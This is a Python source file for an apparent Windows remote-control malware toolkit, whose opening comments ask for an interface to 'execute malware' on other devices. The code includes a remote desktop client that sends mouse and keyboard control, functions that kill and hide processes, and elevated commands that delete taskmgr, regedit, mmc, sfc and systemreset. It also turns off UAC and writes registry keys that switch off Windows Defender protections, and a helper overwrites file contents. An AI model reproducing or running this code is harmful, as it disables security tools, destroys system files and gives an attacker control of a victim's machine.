# code here an interface, mayhaps in html or something in where you can execute malware and control/remote to other device and prehaps
# have a button to install an execute diversify to system32, this file can be as big as it wants, you are not executing this on PC, only on a thumb drive



# also add a button to open ports to the IP address of the machine so that you'd have access to the port online
 
# import all the same ol' imports
 
import time
startup_START = time.time()

import ctypes
import sys
import os

admin_privileges = False
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    print("Not running with administrator privileges!")
else:
    admin_privileges = True
    print("Running with administrator privileges!")
# def run_as_admin():
#         if ctypes.windll.shell32.IsUserAnAdmin() == 0:
#                 #shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c ' + selfScriptFullLocation)
#                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
#                 sys.exit()
# run_as_admin()
import subprocess
import pyautogui
# import netifaces
import threading
import requests
import keyboard
from mark1_translate import translate as translator

from pyshortcuts import make_shortcut
import string
import wget
from sys import exit
from PIL import Image, ImageChops
# import urllib.request
from ctypes import *
import numpy as np
import win32gui
import win32process
import imutils
# import cv2
import json
import concurrent.futures
import base64
from concurrent.futures import ThreadPoolExecutor
# import urllib
try:
    import scapy.all
except Exception as e:
    print(f'Error: {e}')
import pyttsx3
import socket
import threading
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import winsound
import pynput
import wave
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import multiprocessing
import signal
import pygame
import shlex
import pyautogui as pt
import sounddevice as sd
import comtypes
from Crypto.Cipher import AES
from Crypto.Util import number
import win32api
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import re
import psutil
from tcp_latency import measure_latency
from random import *
import ast
from pynput.keyboard import Key, Listener
import win32con
import logging
from datetime import datetime
from gtts import gTTS
import playsound
# from pytube import YouTube
import pythoncom, pyWinhook
import win32comext.shell.shell as shell
from langdetect import detect, DetectorFactory

import trace
import gevent
# print(gevent.version_info)

import socket
import struct
import random
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from random import choice as choice_list
from flask import Flask, render_template
from flask_socketio import SocketIO
import requests
import socket
import geocoder
from geopy.geocoders import Nominatim
from geopy.geocoders import Photon
from engineio.async_drivers import gevent
from flask import Flask, jsonify, render_template
from flask import Flask, render_template, request, Response
from PIL import Image
from flask import url_for
from flask import *
from flask import Flask, request, jsonify
from random import choice as choice_list
# import tensorflow as tf
import numpy as np

# import urllib.parse

import numpy as np
from PIL import Image, ImageTk
import io
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import threading
import traceback
import subprocess  # For launching the client


development_mode = os.getlogin() == 'thesh'
print(f'Development mode: {development_mode}')

def slp(seconds):
    "Sleeps without causing the thread to sleep"
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass
    return


# original_print = print

COMMAND_DELIMITER = ";;"  # Define a command delimiter




def remote_desktop_client(ip_address, port=53074):
    root = tk.Tk()
    client = RemoteDesktopClient(root, ip_address, port)
    root.bind("<Motion>", client.send_mouse_event)
    root.bind("<Button-1>", client.send_click_event)
    root.bind("<Button-2>", client.send_click_event)
    root.bind("<Button-3>", client.send_click_event)
    root.bind("<ButtonRelease-1>", client.send_release_event)
    root.bind("<ButtonRelease-2>", client.send_release_event)
    root.bind("<ButtonRelease-3>", client.send_release_event)
    root.bind("<Key>", client.send_key_event)
    root.mainloop()

class RemoteDesktopClient:
    def __init__(self, master, ip_address, port):
        self.master = master
        self.ip_address = ip_address
        self.port = port
        master.title("Remote Desktop Client")

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TButton', background='#2a2a2a', foreground='white')
        self.style.configure('TCheckbutton', background='#1e1e1e', foreground='white')
        self.style.configure('TEntry', fieldbackground='#2a2a2a', foreground='white')
        self.style.configure('TScale', background='#1e1e1e', troughcolor='#2a2a2a')

        self.frame = ttk.Frame(master, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)

        self.canvas = tk.Canvas(self.frame, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)

        control_frame = ttk.Frame(self.frame)
        control_frame.pack(fill=tk.X, pady=10)

        self.ip_label = ttk.Label(control_frame, text=f"Host IP: {self.ip_address}")
        self.ip_label.pack(side=tk.LEFT, padx=5)

        self.connect_button = ttk.Button(control_frame, text="Connect", command=self.connect)
        self.connect_button.pack(side=tk.LEFT, padx=5)

        self.disconnect_button = ttk.Button(control_frame, text="Disconnect", command=self.disconnect, state=tk.DISABLED)
        self.disconnect_button.pack(side=tk.LEFT, padx=5)

        self.control_var = tk.BooleanVar()
        self.control_checkbox = ttk.Checkbutton(control_frame, text="Enable Control", variable=self.control_var, command=self.toggle_control)
        self.control_checkbox.pack(side=tk.LEFT, padx=5)



        self.scale_var = tk.DoubleVar(value=1.0)
        self.scale_slider = ttk.Scale(control_frame, from_=0.1, to=2.0, orient=tk.HORIZONTAL, variable=self.scale_var, command=self.update_scale)
        self.scale_slider.pack(side=tk.LEFT, padx=5)

        self.scale_label = ttk.Label(control_frame, text="Scale: 1.0x")
        self.scale_label.pack(side=tk.LEFT, padx=5)

        self.control_options = ["Disable keyboard", "Disable mouse", "Enable keyboard", "Enable mouse"]
        self.control_dropdown = ttk.Combobox(control_frame, values=self.control_options, state="readonly")
        self.control_dropdown.pack(side=tk.LEFT, padx=5)
        self.control_dropdown.set(self.control_options[0])

        self.send_event_button = ttk.Button(control_frame, text="Send Event", command=self.send_control_event)
        self.send_event_button.pack(side=tk.LEFT, padx=5)

        self.connection_status_label = ttk.Label(control_frame, text="Connection Status: Disconnected (Ping: N/A)")
        self.connection_status_label.pack(side=tk.RIGHT, padx=5)

        self.socket = None
        self.connected = False
        self.host_screen_size = (0, 0)
        self.scale_factor = 1.0
        self.current_image = None

        self.master.bind("<Configure>", self.on_resize)
        self.last_mouse_position = (0, 0)
        self.mouse_update_interval = 0.05
        self.last_mouse_update_time = 0

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)  # Set a timeout of 5 seconds
        try:
            self.socket.connect((self.ip_address, self.port))
            response = self.socket.recv(1024).decode()
            if response == "Request accepted":
                self.connected = True
                self.connect_button.config(state=tk.DISABLED)
                self.disconnect_button.config(state=tk.NORMAL)
                
                size_data = self.socket.recv(1024).decode().split(',')
                self.host_screen_size = (int(size_data[0]), int(size_data[1]))
                self.update_scale()
                
                self.update_connection_status("Connection Stable")
                receivescreen_thread = threading.Thread(target=self.receive_screen, daemon=True)
                receivescreen_thread.start()
                # threading.Thread(target=self.ping_host, daemon=True).start() # it is causing problems, create a separate socket
        except socket.timeout:
            self.update_connection_status("Connection Failed: Timeout")
            messagebox.showerror("Connection Error", "Connection timed out")
        except Exception as e:
            self.update_connection_status("Connection Failed")
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        if self.connected:
            try:
                self.socket.send(f"DISCONNECT{COMMAND_DELIMITER}".encode())
                self.socket.close()
            except:
                pass
            finally:
                self.connected = False
                self.connect_button.config(state=tk.NORMAL)
                self.disconnect_button.config(state=tk.DISABLED)
                self.update_connection_status("Disconnected")

    def update_connection_status(self, status, ping=None):
        ping_str = f"Ping: {ping:.2f}ms" if ping is not None else "Ping: N/A"
        self.connection_status_label.config(text=f"Connection Status: {status} ({ping_str})")


    def ping_host(self):
        while self.connected:
            try:
                start_time = time.time()
                self.socket.send(f"PING{COMMAND_DELIMITER}".encode())
                self.socket.recv(1024)  # Wait for pong response
                ping = (time.time() - start_time) * 1000  # Convert to milliseconds
                self.update_connection_status("Connection Stable", ping)
            except Exception as e:
                self.update_connection_status("Connection Weak")
            time.sleep(1)  # Ping every second

    def toggle_control(self):
        if self.connected:
            if self.control_var.get():
                self.socket.send(f"ENABLE_CONTROL{COMMAND_DELIMITER}".encode())
            else:
                self.socket.send(f"DISABLE_CONTROL{COMMAND_DELIMITER}".encode())
    def send_control_event(self):
        if self.connected:
            event = self.control_dropdown.get()
            self.socket.send(f"{event}{COMMAND_DELIMITER}".encode())


    def update_scale(self, *args):
        self.scale_factor = self.scale_var.get()
        self.scale_label.config(text=f"Scale: {self.scale_factor:.1f}x")
        self.resize_image()

    def resize_image(self):
        if self.current_image:
            scaled_size = (int(self.host_screen_size[0] * self.scale_factor),
                           int(self.host_screen_size[1] * self.scale_factor))
            resized_image = self.current_image.resize(scaled_size, Image.LANCZOS)
            self.display_image(resized_image)

    def on_resize(self, event=None): 
        if self.current_image:
            self.resize_image()
            self.master.geometry("")  # Auto-resize window

    def receive_screen(self):
        while self.connected:
            try:
                self.socket.settimeout(5) 
                is_full_image = self.socket.recv(1) == b'1'
                size = int.from_bytes(self.socket.recv(4), byteorder='big')

                img_data = b''
                while len(img_data) < size:
                    chunk = self.socket.recv(size - len(img_data))
                    if not chunk:
                        raise RuntimeError("socket connection broken")
                    img_data += chunk
                
                # If using compression on the server:
                # img_data = zlib.decompress(img_data)

                image = Image.open(io.BytesIO(img_data))
                
                self.current_image = image
                self.resize_image()
                self.update_connection_status("Connection Stable")
            except socket.timeout:
                self.update_connection_status("Connection Weak")
            except Exception as e:
                print(f"Error receiving screen: {e}")
                traceback.print_exc()
                self.update_connection_status("Connection Failed")
                self.disconnect()
                break

    def display_image(self, image):
        photo = ImageTk.PhotoImage(image)
        self.canvas.delete("all")
        self.canvas.config(width=image.width, height=image.height)
        self.canvas.create_image(0, 0, anchor=tk.NW, image=photo)
        self.canvas.image = photo

    def send_mouse_event(self, event):
        if self.connected and self.control_var.get():
            current_time = time.time()
            if current_time - self.last_mouse_update_time >= self.mouse_update_interval:
                x = int(event.x / self.scale_factor)
                y = int(event.y / self.scale_factor)
                self.socket.send(f"MOUSE,{x},{y}{COMMAND_DELIMITER}".encode())
                self.last_mouse_update_time = current_time
                self.last_mouse_position = (x, y)

    def send_click_event(self, event):
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},down,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_release_event(self, event):
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},up,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_key_event(self, event):
        if self.connected and self.control_var.get():
            key = event.char
            if not key:
                key = event.keysym

            key_state = "down" if event.type == '2' else "up" # 2: KeyPress, 3: KeyRelease
            self.socket.send(f"KEY,{key},{key_state}{COMMAND_DELIMITER}".encode())

 


app = Flask(__name__, static_folder='./')#, template_folder='./')
socketio = SocketIO(app, async_mode='gevent')

thread_scan_network = None
last_response_from_clientUI = None
newresponse = None
currentSelectedIPV4 = None # formatted so, "192.168.1.1:80"
windowsDoneFrozen = False

# Override print
# def print(*args, **kwargs):
    # text = ' '.join(map(str, args)) + ''.join(map(str, kwargs.values()))
    # update_console(text)
    # original_print(*args, **kwargs)
    
    
# print('hello!')

def get_script_directory():
    if getattr(sys, 'frozen', False):
        # If the script is running as a bundled executable (e.g., PyInstaller)
        # print('Running as a bundled executable(pyinstaller)')
        return os.path.dirname(sys.executable)
    else:
        # If the script is running as a regular Python script
        return os.path.dirname(os.path.abspath(__file__))

def get_script_filename():
    if getattr(sys, 'frozen', False):
        # If the script is running as a bundled executable (e.g., PyInstaller)
        # print('Running as a bundled executable(pyinstaller)')
        return os.path.basename(sys.executable)
    else:
        # If the script is running as a regular Python script
        return os.path.basename(__file__)
    
def kill_self():
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')


def get_hwnds_for_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    return hwnds


def get_pids_for_process_name(process_name):
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() == process_name:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return pids


def hide_process_via_name(name): # e.g. chrome.exe
    pids = get_pids_for_process_name(name)
    for i in pids:
        hwnds = get_hwnds_for_pid(i)
        for hwnd in hwnds:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
def hide_process_via_pid(pid): # e.g. chrome.exe
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        

    
def get_process_name_from_pid(pid): 
    return psutil.Process(pid).name()

def get_parent_process_name_from_pid(pid):
    return psutil.Process(pid).parent().name()

def get_own_parent_process_pid():
    return os.getppid()

def get_process_connected_pids(pid):
    # Get the process with the given PID
    proc = psutil.Process(pid)
    
    # Get the parent process of the process
    parent = proc.parent()
    
    # Get the PID of the parent process
    if parent is not None:
        ppid = parent.pid
    else:
        ppid = None
    
    # Get a list of child processes of the process
    children = proc.children()
    
    # Get a list of PIDs of the child processes
    child_pids = [child.pid for child in children]
    
    # Create a list to store all the PIDs
    all_pids = []
    
    # Add the PID of the process to the list
    all_pids.append(pid)
    
    # Add the PPID of the process to the list (if it exists)
    if ppid is not None:
        all_pids.append(ppid)
    
    # Add the child PIDs of the process to the list
    all_pids.extend(child_pids)
    
    # Return the list of all PIDs
    return all_pids


def restart_explorer():
    runcmd("taskkill /f /im explorer.exe") # don't use /t, it kills everything including the dvrfy program
    runcmd("explorer.exe", retry=4)

def get_username_os():
    return os.getlogin()
def terminate_unknown_processes():
    '''
    Clean out all the windows and running processes.
    '''

    user = os.getenv("USERNAME")
    print(f'Initiating a terminate unknown process')
    # a list to kill processes when got all. # PID ONLY!
    tokill = []

    # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
    exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']
    exclude_list = [x.lower() for x in exclude_list]
    # ['System', '', 'Registry', 'LsaIso.exe', 'RuntimeBroker.exe', 'TrustedInstaller.exe', 'MemCompression', 'wlms.exe', 'sqlwriter.exe', 'MsMpEng.exe', 'AggregatorHost.exe', 'RuntimeBroker.exe', 'manage-bde.exe', 'WindowsTerminal.exe', 'MpCmdRun.exe', 'userinit.exe', 'OpenConsole.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'Widgets.exe', 'SearchHost.exe', 'StartMenuExperienceHost.exe', 'dllhost.exe', 'dllhost.exe', 'NisSrv.exe', 'MpCmdRun.exe', 'WmiPrvSE.exe', 'dllhost.exe', 'mobsync.exe', 'findstr.exe', 'WmiPrvSE.exe']

    exclude_list_HAVE = ["System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    # Functions:
    def corruptfile(directoryoffile):
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()

    def getchildrenofprocess(pid):
            process = psutil.Process(pid)
            for child in process.children(recursive=True):
                    add(child.pid)
                    
    #        f.write(f"Process {pid} was killed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())
    def add(pid, children=False):
            if pid == ownprogrampid or pid == ownprogramparrentpid:
                    # to not kill self.
                    pass
            else:
                    if children == True:
                            getchildrenofprocess(pid)
                    if pid not in tokill:
                            tokill.append(pid)

    processes = psutil.process_iter()
    system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
    system32_files = [x.lower() for x in system32_files]
    windows_files = os.listdir(os.environ['WINDIR'])
    windows_files = [x.lower() for x in windows_files]
    
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    # Iterate through the list of processes
    for process in processes:
        try:
            # Get the process ID, name, and executable path
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.lower().replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.lower().replace('\\', '/').replace('//', '/'):
                continue
            else:
    
                    # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder
                    # print(f'Comperison of {name} PATH: {exe_path} equal?: ', name, ' to: ', tmpnamefilenameself.lower(), ' path: ', exe_path.lower().replace("\\", "/").replace("//", "/"), '  to: ', a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/"))
                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                            pass
                    else:
                        if name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                                pass
                        else:
                                #print(f'Comperison of {name} {exe_path}, Is the name from System32? {name in system32_files}, Is the name from Windows folder? {name in windows_files}')
                            if pid not in lsttocheck:
                                # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being added to the list, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                                add(pid)
                                # print(f'Found {psutil.Process(pid).name()} @ {psutil.Process(pid).exe()}')
        except Exception as e:
                # print(f'Error: {e}')
                pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia in exclude_list_HAVE:
            pass
        else:   
            newlisttokill.append(i)
    tokill = newlisttokill      
    
    # save locations.
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            #print(f'Error: {e}')
            continue
    # Kill all the processes in the list of processes to kill
    
    # filter tokill list from exclude_list_have
    
         
    
    #name_pid_list = [psutil.Process(pid).name() for pid in tokill]
    #print(name_pid_list)
    #sleep(4)    

    print('initiating the to-kill in terminate unknown processes!')
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid:
            continue
        if pid in lsttocheck:
            continue
        else:
            try:
                proc = psutil.Process(pid)
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                
                # print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    continue
                else:
                    # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being killed, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                    # slp(1)
                    # runcmd('taskkill /f /im ' + psutil.Process(pid).name())
                    psutil.Process(pid).kill()
            except Exception as e:
                #print(f'Error: {e}') 
                pass

    
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
print(f'It has taken {(time.time() - startup_START):.2f} seconds to load all the imports')



class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True




SelfUserUsername = os.environ['username']
SelfComputerName= os.environ['COMPUTERNAME'] # --uac-admin ; Py installer to get UAC admin rights on exe

# Get the screen width and height
screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)
print(f'{screen_width}, {screen_height}, SelfUserUsername: {SelfUserUsername}, SelfComputerName: {SelfComputerName}')


# app = Flask(__name__, template_folder='./', static_folder='./')

# @app.route('/', methods=['GET'])
# def index():
#  return render_template('index.html')

# @app.route('/submit', methods=['POST'])
# def submit():
#  button = request.form.get('button')
#  message = f"{button} was clicked."
#  print(f'{message}')
#  return jsonify(message=message)

# if __name__ == '__main__':
#  app.run(host=socket.gethostbyname(socket.gethostname()))


def programVL2(cmd, suppress=False, retry=0):
        try:
                a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
                #print(a)
                if a['hInstApp'] > 32:
                        if suppress == False:
                                print("The admin command ran successfully", "@ command :", cmd)
                        else:
                                pass
                else:
                        if suppress == False:
                                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
                        else:
                                pass
                        if suppress == False:
                                print(f'{retry+1} Retrying running(admin): {cmd}')
                        retry +=1
                        if retry > 4:
                                return
                        return programVL2(cmd, suppress, retry)
        except Exception as e:
                print(f'Error at programVL2, {e}, CMD:{cmd}')
                if 'The operation was canceled by the user.' in e.args:
                        retry +=1
                        return programVL2(cmd, suppress, retry)
def runcmd(cmd, suppress=False, retry=0):
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if suppress == False:
                print("The command ran successfully", "@ command :", cmd)
            else:
                pass
        else:
            if suppress == False:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            else:
                pass
            if suppress == False:
                print(f'{retry+1} Retrying running: {cmd}')
            retry +=1
            if retry > 4:
                    return
            return runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')


#dvrfy vary implementation here:


def installchrome():
    url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
    length = 10
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    filename = f'{filename}.exe'
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    filename_dir = os.path.join(download_dir, filename)

    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(os.path.join(download_dir, filename), "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
    
    slp(2)
    def runinstallcommand():
        programVL2(filename_dir + ' /install')
        
    atmp = threading.Thread(target=runinstallcommand)
    atmp.start()
    
    

def corrupttaskmgr():
    programVL2('takeown /f taskmgr.exe')
    programVL2('icacls "C:\\Windows\\system32\\taskmgr.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskmgr.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\taskmgr.exe"')
def corruptmmc():
    programVL2('takeown /f "C:\\Windows\\system32\\mmc.exe"')
    programVL2('icacls "C:\\Windows\\system32\\mmc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im mmc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\mmc.exe"')
def corruptregedit():
    programVL2('takeown /f "C:\\Windows\\regedit.exe"')
    programVL2('icacls "C:\\Windows\\regedit.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im regedit.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\regedit.exe"')
def corruptdllhost():
    programVL2('takeown /f "C:\\Windows\\dllhost.exe"')
    programVL2('icacls "C:\\Windows\\dllhost.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im dllhost.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\dllhost.exe"')
def corruptsfc():
    programVL2('takeown /f "C:\\Windows\\System32\\sfc.exe"')
    programVL2('icacls "C:\\Windows\\System32\\sfc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im sfc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\sfc.exe"')
def corruptsystemreset():
    programVL2('takeown /f "C:\\Windows\\System32\\systemreset.exe"')
    programVL2('icacls "C:\\Windows\\System32\\systemreset.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im systemreset.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\systemreset.exe"')




def screenoff():
    print('turning off screen')
    update_console('turning off the screen')
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 



def disableUserAccountControl():
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')      
def enableUserAccountControl():
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      



def swapRMBAndLMB(): # invert left click and right click
    '''Set can be equal to swapped or ntswapped'''
    # Define the SM_SWAPBUTTON constant
    SM_SWAPBUTTON = 23
    # Check if the left and right mouse buttons are swapped
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton

    if swapped:
        print('not Swapped rmb and lmb')
        SwapMouseButton(False)
    else:
        print('swapped rmb and lmb')
        SwapMouseButton(True)






def DisableWindowsDefender():
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
